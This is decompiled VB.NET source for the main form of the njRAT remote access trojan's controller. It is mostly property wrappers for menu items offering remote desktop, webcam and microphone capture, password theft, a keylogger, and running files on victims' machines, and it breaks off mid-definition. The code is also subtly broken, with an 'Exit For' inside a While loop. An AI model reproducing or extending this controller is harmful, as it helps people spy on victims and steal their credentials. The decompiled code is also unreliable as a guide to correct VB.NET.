Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x0200000F RID: 15
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x0600017A RID: 378 RVA: 0x0000D320 File Offset: 0x0000B520
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Form1.__ENCList
			SyncLock _ENCList
				If Form1.__ENCList.Count = Form1.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Form1.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Form1.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Form1.__ENCList(num) = Form1.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num)
					Form1.__ENCList.Capacity = Form1.__ENCList.Count
				End If
				Form1.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700008D RID: 141
		' (get) Token: 0x0600017D RID: 381 RVA: 0x000108E8 File Offset: 0x0000EAE8
		' (set) Token: 0x0600017E RID: 382 RVA: 0x00002AAD File Offset: 0x00000CAD
		Friend Overridable Property StatusStrip1 As StatusStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._StatusStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As StatusStrip)
				Me._StatusStrip1 = value
			End Set
		End Property

		' Token: 0x1700008E RID: 142
		' (get) Token: 0x0600017F RID: 383 RVA: 0x00010900 File Offset: 0x0000EB00
		' (set) Token: 0x06000180 RID: 384 RVA: 0x00010918 File Offset: 0x0000EB18
		Friend Overridable Property ToolStripStatusLabel1 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel1_Click
				If Me._ToolStripStatusLabel1 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel1.Click, value2
				End If
				Me._ToolStripStatusLabel1 = value
				If Me._ToolStripStatusLabel1 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008F RID: 143
		' (get) Token: 0x06000181 RID: 385 RVA: 0x00010970 File Offset: 0x0000EB70
		' (set) Token: 0x06000182 RID: 386 RVA: 0x00010988 File Offset: 0x0000EB88
		Friend Overridable Property ToolStripStatusLabel3 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel3_Click
				If Me._ToolStripStatusLabel3 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel3.Click, value2
				End If
				Me._ToolStripStatusLabel3 = value
				If Me._ToolStripStatusLabel3 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000090 RID: 144
		' (get) Token: 0x06000183 RID: 387 RVA: 0x000109E0 File Offset: 0x0000EBE0
		' (set) Token: 0x06000184 RID: 388 RVA: 0x000109F8 File Offset: 0x0000EBF8
		Friend Overridable Property ToolStripStatusLabel5 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel5_Click
				If Me._ToolStripStatusLabel5 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel5.Click, value2
				End If
				Me._ToolStripStatusLabel5 = value
				If Me._ToolStripStatusLabel5 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel5.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000091 RID: 145
		' (get) Token: 0x06000185 RID: 389 RVA: 0x00010A50 File Offset: 0x0000EC50
		' (set) Token: 0x06000186 RID: 390 RVA: 0x00010A68 File Offset: 0x0000EC68
		Friend Overridable Property ToolStripStatusLabel4 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel4_Click
				If Me._ToolStripStatusLabel4 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel4.Click, value2
				End If
				Me._ToolStripStatusLabel4 = value
				If Me._ToolStripStatusLabel4 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000092 RID: 146
		' (get) Token: 0x06000187 RID: 391 RVA: 0x00010AC0 File Offset: 0x0000ECC0
		' (set) Token: 0x06000188 RID: 392 RVA: 0x00002AB6 File Offset: 0x00000CB6
		Friend Overridable Property conz As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._conz
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._conz = value
			End Set
		End Property

		' Token: 0x17000093 RID: 147
		' (get) Token: 0x06000189 RID: 393 RVA: 0x00010AD8 File Offset: 0x0000ECD8
		' (set) Token: 0x0600018A RID: 394 RVA: 0x00002ABF File Offset: 0x00000CBF
		Friend Overridable Property upl As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._upl
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._upl = value
			End Set
		End Property

		' Token: 0x17000094 RID: 148
		' (get) Token: 0x0600018B RID: 395 RVA: 0x00010AF0 File Offset: 0x0000ECF0
		' (set) Token: 0x0600018C RID: 396 RVA: 0x00002AC8 File Offset: 0x00000CC8
		Friend Overridable Property dwn As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._dwn
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._dwn = value
			End Set
		End Property

		' Token: 0x17000095 RID: 149
		' (get) Token: 0x0600018D RID: 397 RVA: 0x00010B08 File Offset: 0x0000ED08
		' (set) Token: 0x0600018E RID: 398 RVA: 0x00002AD1 File Offset: 0x00000CD1
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000096 RID: 150
		' (get) Token: 0x0600018F RID: 399 RVA: 0x00010B20 File Offset: 0x0000ED20
		' (set) Token: 0x06000190 RID: 400 RVA: 0x00010B38 File Offset: 0x0000ED38
		Friend Overridable Property ManagerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ManagerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ManagerToolStripMenuItem_Click
				If Me._ManagerToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ManagerToolStripMenuItem.Click, value2
				End If
				Me._ManagerToolStripMenuItem = value
				If Me._ManagerToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ManagerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000097 RID: 151
		' (get) Token: 0x06000191 RID: 401 RVA: 0x00010B90 File Offset: 0x0000ED90
		' (set) Token: 0x06000192 RID: 402 RVA: 0x00002ADA File Offset: 0x00000CDA
		Friend Overridable Property RunFileToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RunFileToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._RunFileToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x17000098 RID: 152
		' (get) Token: 0x06000193 RID: 403 RVA: 0x00010BA8 File Offset: 0x0000EDA8
		' (set) Token: 0x06000194 RID: 404 RVA: 0x00010BC0 File Offset: 0x0000EDC0
		Friend Overridable Property FromLinkToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromLinkToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLinkToolStripMenuItem_Click
				If Me._FromLinkToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FromLinkToolStripMenuItem.Click, value2
				End If
				Me._FromLinkToolStripMenuItem = value
				If Me._FromLinkToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000099 RID: 153
		' (get) Token: 0x06000195 RID: 405 RVA: 0x00010C18 File Offset: 0x0000EE18
		' (set) Token: 0x06000196 RID: 406 RVA: 0x00010C30 File Offset: 0x0000EE30
		Friend Overridable Property FromDiskToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromDiskToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDiskToolStripMenuItem_Click
				If Me._FromDiskToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FromDiskToolStripMenuItem.Click, value2
				End If
				Me._FromDiskToolStripMenuItem = value
				If Me._FromDiskToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FromDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009A RID: 154
		' (get) Token: 0x06000197 RID: 407 RVA: 0x00010C88 File Offset: 0x0000EE88
		' (set) Token: 0x06000198 RID: 408 RVA: 0x00010CA0 File Offset: 0x0000EEA0
		Friend Overridable Property ScriptToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ScriptToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ScriptToolStripMenuItem_Click
				If Me._ScriptToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ScriptToolStripMenuItem.Click, value2
				End If
				Me._ScriptToolStripMenuItem = value
				If Me._ScriptToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ScriptToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009B RID: 155
		' (get) Token: 0x06000199 RID: 409 RVA: 0x00010CF8 File Offset: 0x0000EEF8
		' (set) Token: 0x0600019A RID: 410 RVA: 0x00010D10 File Offset: 0x0000EF10
		Friend Overridable Property RemoteDesktopToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoteDesktopToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteDesktopToolStripMenuItem_Click
				If Me._RemoteDesktopToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RemoteDesktopToolStripMenuItem.Click, value2
				End If
				Me._RemoteDesktopToolStripMenuItem = value
				If Me._RemoteDesktopToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RemoteDesktopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009C RID: 156
		' (get) Token: 0x0600019B RID: 411 RVA: 0x00010D68 File Offset: 0x0000EF68
		' (set) Token: 0x0600019C RID: 412 RVA: 0x00010D80 File Offset: 0x0000EF80
		Friend Overridable Property RemoteCamToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoteCamToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteCamToolStripMenuItem_Click
				If Me._RemoteCamToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RemoteCamToolStripMenuItem.Click, value2
				End If
				Me._RemoteCamToolStripMenuItem = value
				If Me._RemoteCamToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RemoteCamToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009D RID: 157
		' (get) Token: 0x0600019D RID: 413 RVA: 0x00010DD8 File Offset: 0x0000EFD8
		' (set) Token: 0x0600019E RID: 414 RVA: 0x00010DF0 File Offset: 0x0000EFF0
		Friend Overridable Property MicrophoneToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._MicrophoneToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MicrophoneToolStripMenuItem_Click
				If Me._MicrophoneToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._MicrophoneToolStripMenuItem.Click, value2
				End If
				Me._MicrophoneToolStripMenuItem = value
				If Me._MicrophoneToolStripMenuItem IsNot Nothing Then
					AddHandler Me._MicrophoneToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009E RID: 158
		' (get) Token: 0x0600019F RID: 415 RVA: 0x00010E48 File Offset: 0x0000F048
		' (set) Token: 0x060001A0 RID: 416 RVA: 0x00010E60 File Offset: 0x0000F060
		Friend Overridable Property GetPasswordsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._GetPasswordsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.GetPasswordsToolStripMenuItem_Click
				If Me._GetPasswordsToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._GetPasswordsToolStripMenuItem.Click, value2
				End If
				Me._GetPasswordsToolStripMenuItem = value
				If Me._GetPasswordsToolStripMenuItem IsNot Nothing Then
					AddHandler Me._GetPasswordsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009F RID: 159
		' (get) Token: 0x060001A1 RID: 417 RVA: 0x00010EB8 File Offset: 0x0000F0B8
		' (set) Token: 0x060001A2 RID: 418 RVA: 0x00010ED0 File Offset: 0x0000F0D0
		Friend Overridable Property KeyloggerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KeyloggerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyloggerToolStripMenuItem_Click
				If Me._KeyloggerToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._KeyloggerToolStripMenuItem.Click, value2
				End If
				Me._KeyloggerToolStripMenuItem = value
				If Me._KeyloggerToolStripMenuItem IsNot Nothing Then
					AddHandler Me._KeyloggerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A0 RID: 160
		' (get) Token: 0x060001A3 RID: 419 RVA: 0x00010F28 File Offset: 0x0000F128
		' (set) Token: 0x060001A4 RID: 420 RVA: 0x00010F40 File Offset: 0x0000F140
		Friend Overridable Property OpenChatToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenChatToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenChatToolStripMenuItem_Click
				If Me._OpenChatToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenChatToolStripMenuItem.Click, value2
				End If
				Me._OpenChatToolStripMenuItem = value
				If Me._OpenChatToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenChatToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A1 RID: 161
		' (get) Token: 0x060001A5 RID: 421 RVA: 0x00010F98 File Offset: 0x0000F198
		' (set) Token: 0x060001A6 RID: 422 RVA: 0x00002AE3 File Offset: 0x00000CE3
		Friend Overridable Property ServerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ServerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._ServerToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x170000A2 RID: 162
		' (get) Token: 0x060001A7 RID: 423 RVA: 0x00010FB0 File Offset: 0x0000F1B0
		' (set) Token: 0x060001A8 RID: 424 RVA: 0x00002AEC File Offset: 0x00000CEC
		Friend Overridable Property UpdateToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UpdateToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._UpdateToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x170000A3 RID: 163
		' (get) Token: 0x060001A9 RID: 425 RVA: 0x00010FC8 File Offset: 0x0000F1C8
		' (set) Token: 0x060001AA RID: 426 RVA: 0x00010FE0 File Offset: 0x0000F1E0
		Friend Overridable Property FromDISKToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromDISKToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDISKToolStripMenuItem1_Click
				If Me._FromDISKToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._FromDISKToolStripMenuItem1.Click, value2
				End If
				Me._FromDISKToolStripMenuItem1 = value
				If Me._FromDISKToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._FromDISKToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A4 RID: 164
		' (get) Token: 0x060001AB RID: 427 RVA: 0x00011038 File Offset: 0x0000F238
		' (set) Token: 0x060001AC RID: 428 RVA: 0x00011050 File Offset: 0x0000F250
		Friend Overridable Property FromLINKToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromLINKToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLINKToolStripMenuItem1_Click
				If Me._FromLINKToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._FromLINKToolStripMenuItem1.Click, value2
				End If
				Me._FromLINKToolStripMenuItem1 = value
				If Me._FromLINKToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._FromLINKToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A5 RID: 165
		' (get) Token: 0x060001AD RID: 429 RVA: 0x000110A8 File Offset: 0x0000F2A8
		' (set) Token: 0x060001AE RID: 430 RVA: 0x000110C0 File Offset: 0x0000F2C0
		Friend Overridable Property UninstallToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UninstallToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UninstallToolStripMenuItem_Click
				If Me._UninstallToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UninstallToolStripMenuItem.Click, value2
				End If
				Me._UninstallToolStripMenuItem = value
				If Me._UninstallToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UninstallToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A6 RID: 166
		' (get) Token: 0x060001AF RID: 431 RVA: 0x00011118 File Offset: 0x0000F318
		' (set) Token: 0x060001B0 RID: 432 RVA: 0x00011130 File Offset: 0x0000F330
		Friend Overridable Property RestartToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem_Click
				If Me._RestartToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RestartToolStripMenuItem.Click, value2
				End If
				Me._RestartToolStripMenuItem = value
				If Me._RestartToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RestartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A7 RID: 167
		' (get) Token: 0x060001B1 RID: 433 RVA: 0x00011188 File Offset: 0x0000F388
		' (set) Token: 0x060001B2 RID: 434 RVA: 0x000111A0 File Offset: 0x0000F3A0
		Friend Overridable Property CloseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CloseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CloseToolStripMenuItem_Click
				If Me._CloseToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CloseToolStripMenuItem.Click, value2
				End If
				Me._CloseToolStripMenuItem = value
				If Me._CloseToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CloseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A8 RID: 168
		' (get) Token: 0x060001B3 RID: 435 RVA: 0x000111F8 File Offset: 0x0000F3F8
		' (set) Token: 0x060001B4 RID: 436 RVA: 0x00011210 File Offset: 0x0000F410
		Friend Overridable Property DisconnectToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DisconnectToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DisconnectToolStripMenuItem_Click
				If Me._DisconnectToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DisconnectToolStripMenuItem.Click, value2
				End If
				Me._DisconnectToolStripMenuItem = value
				If Me._DisconnectToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DisconnectToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A9 RID: 169
		' (get) Token: 0x060001B5 RID: 437 RVA: 0x00011268 File Offset: 0x0000F468
		' (set) Token: 0x060001B6 RID: 438 RVA: 0x00011280 File Offset: 0x0000F480
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RenameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RenameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AA RID: 170
		' (get) Token: 0x060001B7 RID: 439 RVA: 0x000112D8 File Offset: 0x0000F4D8
		' (set) Token: 0x060001B8 RID: 440 RVA: 0x000112F0 File Offset: 0x0000F4F0
		Friend Overridable Property OpenFolderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenFolderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenFolderToolStripMenuItem_Click
				If Me._OpenFolderToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenFolderToolStripMenuItem.Click, value2
				End If
				Me._OpenFolderToolStripMenuItem = value
				If Me._OpenFolderToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AB RID: 171
		' (get) Token: 0x060001B9 RID: 441 RVA: 0x00011348 File Offset: 0x0000F548
		' (set) Token: 0x060001BA RID: 442 RVA: 0x00002AF5 File Offset: 0x00000CF5
		Friend Overridable Property IMG2 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._IMG2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._IMG2 = value
			End Set
		End Property

		' Token: 0x170000AC RID: 172
		' (get) Token: 0x060001BB RID: 443 RVA: 0x00011360 File Offset: 0x0000F560
		' (set) Token: 0x060001BC RID: 444 RVA: 0x00011378 File Offset: 0x0000F578
		Friend Overridable Property Njrat As NotifyIcon
			<DebuggerNonUserCode()>
			Get
				Return Me._Njrat
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NotifyIcon)
				Dim value2 As MouseEventHandler = AddressOf Me.NotifyIcon1_MouseDoubleClick
				If Me._Njrat IsNot Nothing Then
					RemoveHandler Me._Njrat.MouseDoubleClick, value2
				End If
				Me._Njrat = value
				If Me._Njrat IsNot Nothing Then
					AddHandler Me._Njrat.MouseDoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170000AD RID: 173
		' (get) Token: 0x060001BD RID: 445 RVA: 0x000113D0 File Offset: 0x0000F5D0
		' (set) Token: 0x060001BE RID: 446 RVA: 0x000113E8 File Offset: 0x0000F5E8
		Friend Overridable Property L1 As L1
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As L1)
				Dim value2 As DataGridViewColumnEventHandler = AddressOf Me.L1_ColumnWidthChanged
				If Me._L1 IsNot Nothing Then
					RemoveHandler Me._L1.ColumnWidthChanged, value2
				End If
				Me._L1 = value
				If Me._L1 IsNot Nothing Then
					AddHandler Me._L1.ColumnWidthChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170000AE RID: 174
		' (get) Token: 0x060001BF RID: 447 RVA: 0x00011440 File Offset: 0x0000F640
		' (set) Token: 0x060001C0 RID: 448 RVA: 0x00002AFE File Offset: 0x00000CFE
		Friend Overridable Property Pp1 As Pp1
			<DebuggerNonUserCode()>
			Get
				Return Me._Pp1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Pp1)
				Me._Pp1 = value
			End Set
		End Property

		' Token: 0x170000AF RID: 175
		' (get) Token: 0x060001C1 RID: 449 RVA: 0x00011458 File Offset: 0x0000F658
		' (set) Token: 0x060001C2 RID: 450 RVA: 0x00002B07 File Offset: 0x00000D07
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip2 = value
			End Set
		End Property

		' Token: 0x170000B0 RID: 176
		' (get) Token: 0x060001C3 RID: 451 RVA: 0x00011470 File Offset: 0x0000F670
		' (set) Token: 0x060001C4 RID: 452 RVA: 0x00011488 File Offset: 0x0000F688
		Friend Overridable Property ShowToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ShowToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ShowToolStripMenuItem_Click
				If Me._ShowToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ShowToolStripMenuItem.Click, value2
				End If
				Me._ShowToolStripMenuItem = value
				If Me._ShowToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ShowToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B1 RID: 177
		' (get) Token: 0x060001C5 RID: 453 RVA: 0x000114E0 File Offset: 0x0000F6E0
